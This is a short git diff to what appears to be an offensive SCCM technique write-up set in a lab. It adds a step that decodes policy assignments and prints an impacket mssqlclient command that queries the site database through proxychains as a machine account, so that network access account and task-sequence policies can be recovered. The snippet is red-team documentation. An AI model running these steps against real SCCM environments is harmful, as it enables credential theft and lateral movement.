@@ -118,7 +118,7 @@ SQL (ludus\SCCM-MGMT$  ludus\SCCM-MGMT$@CM_123)> select * from dbo.UnknownSystem
 2046820353             2   e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7   x64 Unknown Computer (x64 Unknown Computer)   x64 Unknown Computer   x64        2025-06-04 16:15:07   123                       0
 ```
 
-4. Run the `MP_GetMachinePolicyAssignments` SP using the recovered GUID, teeing the results to a file
+4. Run the `MP_GetMachinePolicyAssignments` SP using the recovered GUID, teeing the results to a file. Decode the results to recover the PolicyID and PolicyVersion for the NAAConfig, TaskSequence, and CollectionSettings policies
 ```
 └─# proxychains mssqlclient.py LUDUS/SCCM-MGMT\$@10.3.10.13 -debug  -windows-auth -db CM_123 -command "exec MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N''" |tee assignments.txt
 Impacket v0.13.0.dev0+20250702.182415.b33e994d - Copyright Fortra, LLC and its affiliated companies
@@ -247,3 +247,4 @@ PXE Password: Password123
 - Garrett Foster, [mssqlkaren](https://github.com/garrettfoster13/mssqlkaren)
 
 - Christopher Panayi, [PXEThief](https://github.com/MWR-CyberSec/PXEThief)
+
